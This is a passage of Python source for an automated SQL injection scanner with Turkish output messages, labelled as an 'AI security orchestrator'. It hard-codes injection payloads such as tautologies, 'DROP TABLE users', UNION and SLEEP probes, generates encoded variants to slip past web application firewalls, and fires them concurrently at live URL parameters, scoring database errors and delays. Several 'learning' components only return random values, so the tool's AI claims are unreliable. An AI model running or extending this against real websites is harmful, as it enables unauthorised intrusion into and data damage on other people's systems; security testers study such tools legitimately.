            return {}
        sorted_timings = sorted(timings)
        percentiles = {}
        for p in [25, 50, 75, 90, 95, 99]:
            percentiles[p] = np.percentile(sorted_timings, p)
        return percentiles

    async def test_payload_timing(self, target_url, payload, samples=8):
        timings = []
        test_url = self.inject_payload_to_url(target_url, payload)
        for i in range(samples):
            try:
                start_time = time.time()
                await http_fetch(test_url)
                end_time = time.time()
                timings.append(end_time - start_time)
            except Exception:
                timings.append(None)
        return [t for t in timings if t is not None]

    def analyze_timing_statistics(self, baseline, payload_timings):
        if not payload_timings:
            return {'anomaly': False, 'score': 0}
        baseline_mean = baseline.get('mean', 0)
        baseline_std = baseline.get('std_dev', 0)
        payload_mean = statistics.mean(payload_timings)
        if baseline_std > 0:
            z_score = abs(payload_mean - baseline_mean) / baseline_std
            anomaly = z_score > 2.5
        else:
            ratio = payload_mean / baseline_mean if baseline_mean > 0 else 0
            anomaly = ratio > 3 or ratio < 0.3
        return {
            'anomaly': anomaly,
            'z_score': z_score if baseline_std > 0 else 0,
            'ratio': payload_mean / baseline_mean if baseline_mean > 0 else 0,
            'payload_mean': payload_mean,
            'baseline_mean': baseline_mean
        }

    async def detect_side_channels(self, timings):
        if not timings:
            return {}
        side_channels = {
            'timing_variations': self.analyze_timing_variations(timings),
            'response_consistency': self.analyze_response_consistency(timings),
            'threshold_crossing': self.analyze_threshold_crossing(timings)
        }
        return side_channels

    def analyze_timing_variations(self, timings):
        if len(timings) < 2:
            return {'variance': 0, 'coefficient_of_variation': 0}
        variance = statistics.variance(timings)
        mean = statistics.mean(timings)
        cv = variance / mean if mean > 0 else 0
        return {
            'variance': variance,
            'coefficient_of_variation': cv,
            'high_variance': cv > 0.5
        }

    def analyze_response_consistency(self, timings):
        if len(timings) < 3:
            return {'consistent': True}
        median = statistics.median(timings)
        mad = statistics.median([abs(t - median) for t in timings])
        threshold = median * 0.5 if median > 0 else 0.1
        consistent = mad < threshold
        return {
            'consistent': consistent,
            'mad': mad,
            'threshold': threshold
        }

    def analyze_threshold_crossing(self, timings):
        if len(timings) < 2:
            return {'crossings': 0}
        crossings = sum(1 for t in timings if t > 0.5)
        crossing_rate = crossings / len(timings)
        return {
            'crossings': crossings,
            'crossing_rate': crossing_rate,
            'high_crossing_rate': crossing_rate > 0.3
        }

    def inject_payload_to_url(self, url, payload):
        pu = urlparse(url)
        if pu.query:
            qs = parse_qs(pu.query, keep_blank_values=True)
            if qs:
                first_param = list(qs.keys())[0]
                qs[first_param] = [f"{qs[first_param][0] if qs[first_param] else ''}{payload}"]
                new_query = urlencode(qs, doseq=True, safe=":/@")
                return urlunparse(pu._replace(query=new_query))
        return url

class RLOptimizationEngine:
    def __init__(self):
        self.q_table = {}
        self.reward_functions = {}
        self.policy_network = None
        self.experience_replay = []
        self.learning_rate = 0.1
        self.discount_factor = 0.95
        self.epsilon = 0.1

    async def rl_based_optimization(self, target_environment, episodes=500):
        for episode in range(episodes):
            state = await self.get_environment_state(target_environment)
            action = self.select_action(state, episode)
            reward, next_state = await self.execute_action(action, target_environment)
            self.update_q_table(state, action, reward, next_state)
            self.experience_replay.append((state, action, reward, next_state))
            if len(self.experience_replay) > 50:
                await self.experience_replay_learning()
        return self.extract_optimal_policy()

    def select_action(self, state, episode):
        epsilon = self.calculate_epsilon(episode)
        if random.random() < epsilon:
            return self.random_action()
        else:
            return self.greedy_action(state)

    def calculate_epsilon(self, episode):
        return max(0.01, self.epsilon * (0.995 ** episode))

    def random_action(self):
        actions = ['aggressive_testing', 'balanced_testing', 'conservative_testing', 'adaptive_encoding']
        return random.choice(actions)

    def greedy_action(self, state):
        state_key = self.state_to_key(state)
        if state_key in self.q_table:
            return max(self.q_table[state_key], key=self.q_table[state_key].get)
        return self.random_action()

    async def execute_action(self, action, environment):
        result = await self.apply_action(action, environment)
        reward = self.calculate_reward(result)
        next_state = await self.get_environment_state(environment)
        return reward, next_state

    def calculate_reward(self, test_result):
        reward = 0
        if test_result.get('vulnerability_found'):
            reward += 100
        if test_result.get('new_information'):
            reward += 10
        if test_result.get('efficiency_bonus'):
            reward += 5
        if test_result.get('false_positive'):
            reward -= 50
        if test_result.get('fast_execution'):
            reward += 3
        return reward

    def update_q_table(self, state, action, reward, next_state):
        state_key = self.state_to_key(state)
        next_state_key = self.state_to_key(next_state)
        if state_key not in self.q_table:
            self.q_table[state_key] = {}
        if action not in self.q_table[state_key]:
            self.q_table[state_key][action] = 0
        current_q = self.q_table[state_key][action]
        next_max_q = 0
        if next_state_key in self.q_table:
            next_max_q = max(self.q_table[next_state_key].values()) if self.q_table[next_state_key] else 0
        new_q = current_q + self.learning_rate * (reward + self.discount_factor * next_max_q - current_q)
        self.q_table[state_key][action] = new_q

    async def experience_replay_learning(self):
        batch_size = min(32, len(self.experience_replay))
        batch = random.sample(self.experience_replay, batch_size)
        for state, action, reward, next_state in batch:
            self.update_q_table(state, action, reward, next_state)

    def state_to_key(self, state):
        if isinstance(state, dict):
            return str(sorted(state.items()))
        return str(state)

    async def get_environment_state(self, environment):
        return {
            'target_complexity': environment.get('complexity', 'medium'),
            'previous_success_rate': environment.get('success_rate', 0),
            'test_coverage': environment.get('coverage', 0.5),
            'time_elapsed': environment.get('time_elapsed', 0)
        }

    async def apply_action(self, action, environment):
        return {
            'vulnerability_found': random.random() < 0.1,
            'new_information': random.random() < 0.3,
            'efficiency_bonus': random.random() < 0.2,
            'fast_execution': random.random() < 0.4
        }

    def extract_optimal_policy(self):
        policy = {}
        for state_key, actions in self.q_table.items():
            if actions:
                policy[state_key] = max(actions, key=actions.get)
        return policy

class DynamicTestStrategy:
    def __init__(self):
        self.strategies = {
            'aggressive_testing': {'payload_count': 100, 'encoding_variety': 'high', 'test_depth': 'deep', 'timeout': 30},
            'balanced_testing': {'payload_count': 50, 'encoding_variety': 'medium', 'test_depth': 'normal', 'timeout': 60},
            'conservative_testing': {'payload_count': 25, 'encoding_variety': 'low', 'test_depth': 'shallow', 'timeout': 120}
        }
        self.adaptation_rules = {}
        self.performance_metrics = {}

    async def develop_dynamic_strategy(self, target_analysis):
        base_strategy = self.select_base_strategy(target_analysis)
        adapted_strategy = self.apply_adaptation_rules(base_strategy, target_analysis)
        optimized_strategy = await self.optimize_strategy(adapted_strategy)
        return optimized_strategy

    def select_base_strategy(self, target_analysis):
        risk_level = target_analysis.get('risk_level', 'medium')
        complexity = target_analysis.get('complexity', 'medium')
        if risk_level == 'high' or complexity == 'high':
            return self.strategies['aggressive_testing']
        elif risk_level == 'medium' or complexity == 'medium':
            return self.strategies['balanced_testing']
        else:
            return self.strategies['conservative_testing']

    def apply_adaptation_rules(self, base_strategy, target_analysis):
        adapted = base_strategy.copy()
        if target_analysis.get('waf_detected'):
            adapted['encoding_variety'] = 'high'
            adapted['payload_count'] = min(adapted['payload_count'] * 2, 200)
        if target_analysis.get('response_time') and target_analysis['response_time'] > 2:
            adapted['timeout'] = int(adapted['timeout'] * 1.5)
        if target_analysis.get('security_headers'):
            adapted['test_depth'] = 'deep'
        return adapted

    async def optimize_strategy(self, strategy):
        optimized = strategy.copy()
        if self.performance_metrics.get('false_positive_rate', 0) > 0.3:
            optimized['payload_count'] = max(10, optimized['payload_count'] - 20)
        if self.performance_metrics.get('detection_rate', 0) < 0.1:
            optimized['encoding_variety'] = 'high'
            optimized['payload_count'] = min(optimized['payload_count'] + 30, 150)
        return optimized

    async def adaptive_test_execution(self, strategy, test_queue):
        execution_plan = self.generate_execution_plan(strategy)
        results = []
        for plan_step in execution_plan:
            step_results = await self.execute_test_group(plan_step)
            if self.should_adapt_strategy(step_results):
                strategy = self.adapt_strategy(strategy, step_results)
                execution_plan = self.regenerate_execution_plan(strategy)
            results.extend(step_results)
        return results

    def generate_execution_plan(self, strategy):
        plan = []
        payload_count = strategy.get('payload_count', 50)
        batch_size = min(20, payload_count // 3 + 1)
        for i in range(0, payload_count, batch_size):
            plan.append({
                'batch_start': i,
                'batch_size': min(batch_size, payload_count - i),
                'timeout': strategy.get('timeout', 60)
            })
        return plan

    async def execute_test_group(self, plan_step):
        return [{'result': 'success' if random.random() > 0.2 else 'failure'} 
                for _ in range(plan_step['batch_size'])]

    def should_adapt_strategy(self, recent_results):
        if not recent_results:
            return False
        failure_rate = sum(1 for r in recent_results if r.get('result') == 'failure') / len(recent_results)
        return failure_rate > 0.7

    def adapt_strategy(self, current_strategy, results):
        adapted = current_strategy.copy()
        failure_rate = sum(1 for r in results if r.get('result') == 'failure') / len(results)
        if failure_rate > 0.8:
            adapted['payload_count'] = min(adapted['payload_count'] + 50, 200)
            adapted['encoding_variety'] = 'high'
        elif failure_rate < 0.3:
            adapted['payload_count'] = max(10, adapted['payload_count'] - 10)
        return adapted

    def regenerate_execution_plan(self, strategy):
        return self.generate_execution_plan(strategy)

class AdvancedPatternMiner:
    def __init__(self):
        self.pattern_database = {}
        self.correlation_analyzers = {}
        self.sequence_mining = {}

    async def mine_vulnerability_patterns(self, test_results):
        single_patterns = self.extract_single_patterns(test_results)
        sequence_patterns = await self.mine_sequence_patterns(test_results)
        correlations = self.analyze_pattern_correlations(single_patterns, sequence_patterns)
        synthesized_patterns = self.synthesize_new_patterns(correlations)
        return {
            'single_patterns': single_patterns,
            'sequence_patterns': sequence_patterns,
            'correlations': correlations,
            'synthesized_patterns': synthesized_patterns
        }

    def extract_single_patterns(self, test_results):
        patterns = []
        for result in test_results:
            if isinstance(result, dict):
                pattern = {
                    'payload_structure': self.analyze_payload_structure(result.get('payload', '')),
                    'response_characteristics': self.analyze_response_characteristics(result),
                    'timing_behavior': result.get('timing_analysis', {}),
                    'error_patterns': self.extract_error_patterns(result.get('response', {}).get('html', '')),
                    'success_indicators': self.identify_success_indicators(result)
                }
                patterns.append(pattern)
        return patterns

    def analyze_payload_structure(self, payload):
        if not payload:
            return {}
        return {
            'length': len(payload),
            'quote_types': {'single': payload.count("'"), 'double': payload.count('"')},
            'keywords': self.extract_sql_keywords(payload),
            'operators': self.extract_sql_operators(payload),
            'functions': self.extract_sql_functions(payload)
        }

    def extract_sql_keywords(self, payload):
        keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 'ALTER']
        found = []
        payload_upper = payload.upper()
        for keyword in keywords:
            if keyword in payload_upper:
                found.append(keyword)
        return found

    def extract_sql_operators(self, payload):
        operators = ['OR', 'AND', 'NOT', 'LIKE', 'IN', 'BETWEEN', 'EXISTS']
        found = []
        payload_upper = payload.upper()
        for op in operators:
            if op in payload_upper:
                found.append(op)
        return found

    def extract_sql_functions(self, payload):
        functions = ['COUNT', 'CONCAT', 'SUBSTRING', 'LENGTH', 'UPPER', 'LOWER', 'SLEEP', 'BENCHMARK']
        found = []
        payload_upper = payload.upper()
        for func in functions:
            if func in payload_upper:
                found.append(func)
        return found

    def analyze_response_characteristics(self, result):
        response = result.get('response', {})
        html = response.get('html', '')
        headers = response.get('headers', {})
        status = response.get('status', 200)
        return {
            'status_code': status,
            'content_length': len(html),
            'header_count': len(headers),
            'error_detected': bool(SQL_ERROR_RX.search(html)),
            'sql_error_type': self.identify_sql_error_type(html)
        }

    def identify_sql_error_type(self, html):
        for db_type, pattern in DB_RX.items():
            if re.search(pattern, html, re.I):
                return db_type
        return 'unknown'

    def extract_error_patterns(self, html):
        if not html:
            return []
        error_patterns = []
        general_errors = ['error', 'exception', 'warning', 'fatal', 'stack trace']
        html_lower = html.lower()
        for error in general_errors:
            if error in html_lower:
                error_patterns.append(error)
        return error_patterns

    def identify_success_indicators(self, result):
        indicators = []
        response = result.get('response', {})
        html = response.get('html', '')
        positive_indicators = ['welcome', 'dashboard', 'admin', 'logged in', 'success']
        html_lower = html.lower()
        for indicator in positive_indicators:
            if indicator in html_lower:
                indicators.append(indicator)
        return indicators

    async def mine_sequence_patterns(self, test_results):
        test_sequences = self.reconstruct_test_sequences(test_results)
        sequence_patterns = []
        for sequence in test_sequences:
            pattern = self.extract_sequence_pattern(sequence)
            sequence_patterns.append(pattern)
        return sequence_patterns

    def reconstruct_test_sequences(self, test_results):
        return sorted(test_results, key=lambda x: x.get('timestamp', 0) if isinstance(x, dict) else 0)

    def extract_sequence_pattern(self, sequence):
        if not sequence:
            return {}
        payloads = [s.get('payload', '') for s in sequence if isinstance(s, dict)]
        responses = [s.get('response', {}) for s in sequence if isinstance(s, dict)]
        return {
            'sequence_length': len(sequence),
            'payload_patterns': self.identify_payload_sequence_patterns(payloads),
            'response_patterns': self.identify_response_sequence_patterns(responses),
            'correlation_strength': self.calculate_sequence_correlation(payloads, responses)
        }

    def identify_payload_sequence_patterns(self, payloads):
        if not payloads:
            return []
        patterns = []
        for i in range(len(payloads) - 1):
            if self.payloads_similar(payloads[i], payloads[i+1]):
                patterns.append('consecutive_similar')
        lengths = [len(p) for p in payloads]
        if len(set(lengths)) == 1:
            patterns.append('consistent_length')
        return patterns

    def payloads_similar(self, p1, p2):
        if not p1 or not p2:
            return False
        return abs(len(p1) - len(p2)) < 5

    def identify_response_sequence_patterns(self, responses):
        if not responses:
            return []
        patterns = []
        statuses = [r.get('status', 200) for r in responses]
        if len(set(statuses)) > 1:
            patterns.append('status_variations')
        errors = [bool(SQL_ERROR_RX.search(r.get('html', ''))) for r in responses]
        if any(errors) and not all(errors):
            patterns.append('intermittent_errors')
        return patterns

    def calculate_sequence_correlation(self, payloads, responses):
        return len(payloads) / max(len(responses), 1)

    def analyze_pattern_correlations(self, single_patterns, sequence_patterns):
        correlations = []
        for i, pattern1 in enumerate(single_patterns):
            for j, pattern2 in enumerate(single_patterns):
                if i < j:
                    corr = self.calculate_pattern_correlation(pattern1, pattern2)
                    if corr > 0.5:
                        correlations.append({
                            'pattern1_index': i,
                            'pattern2_index': j,
                            'correlation': corr,
                            'type': 'single_pattern_correlation'
                        })
        for i, seq_pattern1 in enumerate(sequence_patterns):
            for j, seq_pattern2 in enumerate(sequence_patterns):
                if i < j:
                    corr = self.calculate_sequence_correlation_simple(seq_pattern1, seq_pattern2)
                    if corr > 0.3:
                        correlations.append({
                            'pattern1_index': i + len(single_patterns),
                            'pattern2_index': j + len(single_patterns),
                            'correlation': corr,
                            'type': 'sequence_pattern_correlation'
                        })
        return correlations

    def calculate_pattern_correlation(self, pattern1, pattern2):
        score1 = self.pattern_complexity_score(pattern1)
        score2 = self.pattern_complexity_score(pattern2)
        if score1 == 0 and score2 == 0:
            return 1.0
        elif score1 == 0 or score2 == 0:
            return 0.0
        return 1.0 - abs(score1 - score2) / max(score1, score2)

    def pattern_complexity_score(self, pattern):
        if not pattern:
            return 0
        score = 0
        payload_struct = pattern.get('payload_structure', {})
        score += payload_struct.get('length', 0) * 0.1
        score += len(payload_struct.get('keywords', [])) * 2
        score += len(payload_struct.get('operators', [])) * 1.5
        response_char = pattern.get('response_characteristics', {})
        if response_char.get('error_detected'):
            score += 5
        score += response_char.get('content_length', 0) * 0.01
        return score

    def calculate_sequence_correlation_simple(self, seq1, seq2):
        if not seq1 or not seq2:
            return 0
        len1 = seq1.get('sequence_length', 0)
        len2 = seq2.get('sequence_length', 0)
        if len1 == 0 and len2 == 0:
            return 1.0
        elif len1 == 0 or len2 == 0:
            return 0.0
        return 1.0 - abs(len1 - len2) / max(len1, len2)

    def synthesize_new_patterns(self, correlations):
        synthesized = []
        for corr in correlations:
            if corr.get('correlation', 0) > 0.7:
                synthesized.append({
                    'synthesized_from': [corr['pattern1_index'], corr['pattern2_index']],
                    'correlation_strength': corr['correlation'],
                    'pattern_type': 'hybrid'
                })
        return synthesized

class CorrelationAnalyzer:
    def __init__(self):
        self.correlation_methods = ['pearson', 'spearman']
        self.feature_extractors = {}

    async def comprehensive_correlation_analysis(self, test_data):
        features = self.extract_comprehensive_features(test_data)
        correlation_results = {}
        for method in self.correlation_methods:
            correlation_results[method] = self.calculate_correlation(features, method)
        multivariate_analysis = self.perform_multivariate_analysis(features)
        anomaly_correlations = self.analyze_anomaly_correlations(features)
        return {
            'correlations': correlation_results,
            'multivariate_analysis': multivariate_analysis,
            'anomaly_correlations': anomaly_correlations
        }

    def extract_comprehensive_features(self, test_data):
        features = {
            'payload_features': self.extract_payload_features(test_data),
            'response_features': self.extract_response_features(test_data),
            'timing_features': self.extract_timing_features(test_data),
            'behavioral_features': self.extract_behavioral_features(test_data),
            'contextual_features': self.extract_contextual_features(test_data)
        }
        return features

    def extract_payload_features(self, test_data):
        features = []
        for data in test_data:
            if isinstance(data, dict):
                payload = data.get('payload', '')
                features.append({
                    'length': len(payload),
                    'quote_count': payload.count("'") + payload.count('"'),
                    'keyword_count': len(re.findall(r'\b(SELECT|UNION|INSERT|UPDATE|DELETE)\b', payload.upper())),
                    'operator_count': len(re.findall(r'\b(OR|AND|NOT)\b', payload.upper())),
                    'comment_count': payload.count('--') + payload.count('/*')
                })
        return features

    def extract_response_features(self, test_data):
        features = []
        for data in test_data:
            if isinstance(data, dict):
                response = data.get('response', {})
                html = response.get('html', '')
                features.append({
                    'status_code': response.get('status', 200),
                    'content_length': len(html),
                    'error_detected': bool(SQL_ERROR_RX.search(html)),
                    'header_count': len(response.get('headers', {})),
                    'response_time': response.get('response_time', 0)
                })
        return features

    def extract_timing_features(self, test_data):
        features = []
        for data in test_data:
            if isinstance(data, dict):
                response = data.get('response', {})
                features.append({
                    'response_time': response.get('response_time', 0),
                    'timing_variance': 0,
                    'slow_response': response.get('response_time', 0) > 2
                })
        return features

    def extract_behavioral_features(self, test_data):
        features = []
        for data in test_data:
            if isinstance(data, dict):
                features.append({
                    'vulnerability_indicated': data.get('is_vulnerable', False),
                    'confidence_level': self.confidence_to_numeric(data.get('confidence', 'low')),
                    'sql_error_found': data.get('sql_error', False),
                    'content_difference': data.get('diff_core', 0)
                })
        return features

    def confidence_to_numeric(self, confidence):
        mapping = {'very_high': 1.0, 'high': 0.8, 'medium': 0.5, 'low': 0.3, 'very_low': 0.1}
        return mapping.get(confidence, 0.5)

    def extract_contextual_features(self, test_data):
        features = []
        for data in test_data:
            if isinstance(data, dict):
                features.append({
                    'method': 1 if data.get('method', 'GET') == 'GET' else 2,
                    'param_complexity': len(data.get('param', '')),
                    'url_complexity': len(data.get('url', '')),
                    'has_error': bool(data.get('error'))
                })
        return features

    def calculate_correlation(self, features, method='pearson'):
        correlations = {}
        for feature_type1, features1 in features.items():
            for feature_type2, features2 in features.items():
                if feature_type1 != feature_type2 and features1 and features2:
                    corr_key = f"{feature_type1}_vs_{feature_type2}"
                    correlations[corr_key] = self.calculate_feature_correlation(features1, features2, method)
        return correlations

    def calculate_feature_correlation(self, features1, features2, method):
        if not features1 or not features2:
            return 0
        min_len = min(len(features1), len(features2))
        if min_len == 0:
            return 0
        values1 = [list(f.values())[0] if f else 0 for f in features1[:min_len]]
        values2 = [list(f.values())[0] if f else 0 for f in features2[:min_len]]
        if len(values1) < 2 or len(values2) < 2:
            return 0
        try:
            mean1 = statistics.mean(values1)
            mean2 = statistics.mean(values2)
            numerator = sum((v1 - mean1) * (v2 - mean2) for v1, v2 in zip(values1, values2))
            denominator = (sum((v - mean1) ** 2 for v in values1) * sum((v - mean2) ** 2 for v in values2)) ** 0.5
            if denominator == 0:
                return 0
            return numerator / denominator
        except:
            return 0

    def perform_multivariate_analysis(self, features):
        analysis = {}
        combined_scores = []
        for feature_type, feature_list in features.items():
            if feature_list:
                scores = [sum(f.values()) if isinstance(f, dict) else 0 for f in feature_list]
                combined_scores.extend(scores)
        if combined_scores:
            analysis['overall_correlation'] = {
                'mean_score': statistics.mean(combined_scores) if combined_scores else 0,
                'std_score': statistics.stdev(combined_scores) if len(combined_scores) > 1 else 0,
                'max_score': max(combined_scores) if combined_scores else 0,
                'min_score': min(combined_scores) if combined_scores else 0
            }
        return analysis

    def analyze_anomaly_correlations(self, features):
        anomalies = {}
        for feature_type, feature_list in features.items():
            if feature_list and len(feature_list) > 1:
                numeric_values = []
                for feature in feature_list:
                    if isinstance(feature, dict):
                        numeric_values.extend([v for v in feature.values() if isinstance(v, (int, float))])
                if numeric_values and len(numeric_values) > 1:
                    mean_val = statistics.mean(numeric_values)
                    std_val = statistics.stdev(numeric_values) if len(numeric_values) > 1 else 0
                    anomalies[feature_type] = {
                        'anomaly_count': sum(1 for v in numeric_values if abs(v - mean_val) > 3 * std_val),
                        'anomaly_rate': sum(1 for v in numeric_values if abs(v - mean_val) > 3 * std_val) / len(numeric_values),
                        'mean': mean_val,
                        'std': std_val
                    }
        return anomalies

class AISecurityOrchestrator:
    def __init__(self):
        self.modules = {
            'behavioral_profiler': BehavioralProfiler(),
            'contextual_intelligence': DeepSemanticAnalyzer(),
            'polymorphic_generator': PolymorphicPayloadGenerator(),
            'security_detector': SecurityMechanismDetector(),
            'semantic_analyzer': DeepSemanticAnalyzer(),
            'timing_analyzer': AdvancedTimingAnalyzer(),
            'rl_optimizer': RLOptimizationEngine(),
            'strategy_engine': DynamicTestStrategy(),
            'pattern_miner': AdvancedPatternMiner(),
            'correlation_analyzer': CorrelationAnalyzer()
        }
        self.global_state = {}
        self.learning_memory = {}
        self.test_history = []

    async def intelligent_security_assessment(self, target_url):
        print(f"{Fore.CYAN}{Style.BRIGHT}[*] AI: Bütüncül güvenlik değerlendirmesi başlatılıyor: {target_url}")
        target_analysis = await self.initial_target_analysis(target_url)
        print(f"{Fore.GREEN}[+] AI: Hedef analizi tamamlandı: {target_analysis.get('risk_level', 'unknown')}")
        behavioral_profile = await self.modules['behavioral_profiler'].create_behavioral_baseline(target_url)
        print(f"{Fore.GREEN}[+] AI: Davranışsal profil oluşturuldu")
        security_analysis = await self.modules['security_detector'].detect_security_mechanisms(target_url)
        print(f"{Fore.GREEN}[+] AI: Güvenlik mekanizmaları tespit edildi: {security_analysis.get('waf_type', 'none')}")
        test_strategy = await self.modules['strategy_engine'].develop_dynamic_strategy({
            'target_analysis': target_analysis, 'behavioral_profile': behavioral_profile, 'security_analysis': security_analysis
        })
        print(f"{Fore.GREEN}[+] AI: Test stratejisi geliştirildi")
        base_payloads = await self.generate_intelligent_payloads(target_analysis, security_analysis)
        print(f"{Fore.GREEN}[+] AI: {len(base_payloads)} akıllı payload üretildi")
        test_results = await self.execute_adaptive_testing(target_url, base_payloads, test_strategy, security_analysis)
        print(f"{Fore.GREEN}[+] AI: {len(test_results)} test tamamlandı")
        pattern_analysis = await self.modules['pattern_miner'].mine_vulnerability_patterns(test_results)
        correlation_analysis = await self.modules['correlation_analyzer'].comprehensive_correlation_analysis(test_results)
        final_assessment = self.synthesize_final_assessment(
            target_analysis, behavioral_profile, security_analysis, test_results, pattern_analysis, correlation_analysis
        )
        await self.update_learning_memory(final_assessment)
        print(f"{Fore.CYAN}{Style.BRIGHT}[*] AI: Güvenlik değerlendirmesi tamamlandı")
        return final_assessment

    async def initial_target_analysis(self, target_url):
        try:
            response = await http_fetch(target_url)
            html = response.get('html', '')
            headers = response.get('headers', {})
            risk_level = self.calculate_target_risk(target_url, html, headers)
            complexity = self.analyze_target_complexity(html, headers)
            return {
                'url': target_url, 'risk_level': risk_level, 'complexity': complexity,
                'response_time': response.get('response_time', 0), 'status_code': response.get('status', 200),
                'content_length': len(html)
            }
        except Exception as e:
            print(f"{Fore.YELLOW}[!] AI Hedef analizi hatası: {e}")
            return {'url': target_url, 'risk_level': 'medium', 'complexity': 'medium'}

    def calculate_target_risk(self, url, html, headers):
        risk_score = 0
        pu = urlparse(url)
        path_lower = pu.path.lower()
        high_risk_paths = ['/admin', '/api', '/user', '/profile', '/login', '/config']
        if any(path in path_lower for path in high_risk_paths):
            risk_score += 3
        if re.search(r'/api/|/v\d+/|/graphql', path_lower):
            risk_score += 2
        header_string = " ".join([f"{k}:{v}" for k, v in headers.items()]).lower()
        if 'admin' in header_string or 'auth' in header_string:
            risk_score += 2
        html_lower = html.lower()
        if 'admin' in html_lower or 'dashboard' in html_lower:
            risk_score += 1
        if risk_score >= 5:
            return 'high'
        elif risk_score >= 3:
            return 'medium'
        else:
            return 'low'

    def analyze_target_complexity(self, html, headers):
        complexity_score = 0
        soup = BeautifulSoup(html, 'html.parser')
        tag_count = len(soup.find_all())
        complexity_score += min(tag_count / 100, 3)
        complexity_score += min(len(headers) / 5, 2)
        if '<script' in html.lower():
            complexity_score += 1
        if complexity_score >= 4:
            return 'high'
        elif complexity_score >= 2:
            return 'medium'
        else:
            return 'low'

    async def generate_intelligent_payloads(self, target_analysis, security_analysis):
        base_payloads = [
            "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--', "') OR ('1'='1", '") OR ("1"="1',
            "'; DROP TABLE users--", "admin'--", "' UNION SELECT NULL--", "1' ORDER BY 1--"
        ]
        polymorphic_generator = self.modules['polymorphic_generator']
        polymorphic_payloads = polymorphic_generator.generate_polymorphic_payloads(base_payloads)
        base_payloads.extend(polymorphic_payloads)
        # Hata düzeltme: security_analysis'in doğru yapıya sahip olduğundan emin olun
        if isinstance(security_analysis, dict) and security_analysis.get('waf_detected'):
            waf_payloads = await self.modules['security_detector'].generate_waf_bypass_payloads(
                security_analysis, base_payloads
            )
            base_payloads = waf_payloads
        risk_level = target_analysis.get('risk_level', 'medium')
        if risk_level == 'high':
            aggressive_payloads = [
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT SLEEP(5))--",
                "' OR EXISTS(SELECT 1 FROM dual)--"
            ]
            base_payloads.extend(aggressive_payloads)
        return list(dict.fromkeys(base_payloads))[:100]

    async def execute_adaptive_testing(self, target_url, payloads, strategy, security_analysis):
        test_results = []
        payload_count = strategy.get('payload_count', 50)
        timeout = strategy.get('timeout', 60)
        encoding_variety = strategy.get('encoding_variety', 'medium')
        selected_payloads = payloads[:min(payload_count, len(payloads))]
        print(f"{Fore.CYAN}[*] AI: {len(selected_payloads)} payload test ediliyor...")
        semaphore = asyncio.Semaphore(20)
        async def test_single_payload(payload):
            async with semaphore:
                return await self.execute_single_test(target_url, payload, timeout, encoding_variety, security_analysis)
        tasks = [test_single_payload(payload) for payload in selected_payloads]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if not isinstance(result, Exception) and result:
                test_results.append(result)
        return test_results

    async def execute_single_test(self, target_url, payload, timeout, encoding_variety, security_analysis):
        try:
            encoded_payloads = self.prepare_payload_variants(payload, encoding_variety)
            best_result = None
            best_score = -1
            for encoded_payload in encoded_payloads[:5]:
                test_url = self.inject_payload_to_url(target_url, encoded_payload)
                try:
                    response = await http_fetch(test_url)
                    score = self.calculate_test_score(response, payload)
                    if score > best_score:
                        best_score = score
                        best_result = {
                            'url': test_url, 'payload': encoded_payload, 'response': response,
                            'score': score, 'is_vulnerable': score > 0.7, 'timestamp': time.time()
                        }
                except Exception as e: continue
            return best_result
        except Exception as e:
            print(f"{Fore.YELLOW}[!] AI Test yürütme hatası: {e}")
            return None

    def prepare_payload_variants(self, payload, encoding_variety):
        variants = [payload]
        if encoding_variety in ['high', 'medium']:
            variants.append(payload.replace("'", "%27").replace('"', "%22"))
            variants.append(payload.replace("'", "&#39;").replace('"', "&#34;"))
            variants.append(payload.replace(" ", "/**/"))
        if encoding_variety == 'high':
            variants.append(payload.replace("'", "%2527").replace('"', "%2522"))
            if "OR" in payload:
                variants.append(payload.replace("OR", "oR"))
            if "AND" in payload:
                variants.append(payload.replace("AND", "aNd"))
        return list(dict.fromkeys(variants))

    def calculate_test_score(self, response, payload):
        if not response:
            return 0
        score = 0
        html = response.get('html', '')
        if SQL_ERROR_RX.search(html):
            score += 0.8
        response_time = response.get('response_time', 0)
        if response_time > 3:
            score += 0.3
        if len(html) > 10000:
            score += 0.2
        if response.get('status', 200) not in [200, 404]:
            score += 0.1
        return min(score, 1.0)

    def inject_payload_to_url(self, url, payload):
        pu = urlparse(url)
        if pu.query:
            qs = parse_qs(pu.query, keep_blank_values=True)
            if qs:
                first_param = list(qs.keys())[0]
                qs[first_param] = [f"{qs[first_param][0] if qs[first_param] else ''}{payload}"]
                new_query = urlencode(qs, doseq=True, safe=":/@")
                return urlunparse(pu._replace(query=new_query))
        return url

    def synthesize_final_assessment(self, *analyses):
        if len(analyses) < 4:
            return {'error': 'Yetersiz analiz verisi'}
        target_analysis = analyses[0]
        behavioral_profile = analyses[1]
        security_analysis = analyses[2]
        test_results = analyses[3]
        vulnerabilities = self.identify_vulnerabilities(test_results)
        risk_score = self.calculate_risk_score(target_analysis, vulnerabilities, security_analysis)
        confidence_levels = self.calculate_confidence_levels(test_results)
        assessment = {
            'target_info': target_analysis,
            'vulnerabilities': vulnerabilities,
            'risk_score': risk_score,
            'confidence_levels': confidence_levels,
            'recommendations': self.generate_recommendations(target_analysis, vulnerabilities, security_analysis),
            'evidence': self.collect_evidence(test_results),
            'ai_insights': self.generate_ai_insights(target_analysis, behavioral_profile, security_analysis)
        }
        return assessment

    def identify_vulnerabilities(self, test_results):
        vulnerabilities = []
        for result in test_results:
            if isinstance(result, dict) and result.get('is_vulnerable'):
                vulnerabilities.append({
                    'type': 'SQL Injection',
                    'payload': result.get('payload', ''),
                    'url': result.get('url', ''),
                    'confidence': result.get('score', 0),
                    'evidence': {
                        'response_time': result.get('response', {}).get('response_time', 0),
                        'sql_error': bool(SQL_ERROR_RX.search(result.get('response', {}).get('html', ''))),
                        'status_code': result.get('response', {}).get('status', 0)
                    }
                })
        return vulnerabilities

    def calculate_risk_score(self, target_analysis, vulnerabilities, security_analysis):
        base_score = 0
        risk_mapping = {'high': 3, 'medium': 2, 'low': 1}
        base_score += risk_mapping.get(target_analysis.get('risk_level', 'medium'), 2)
        base_score += min(len(vulnerabilities) * 2, 10)
        # Hata düzeltme: security_analysis'in doğru yapıya sahip olduğundan emin olun
        if isinstance(security_analysis, dict) and security_analysis.get('waf_detected'):
            base_score -= 1
        return max(0, min(base_score, 10))

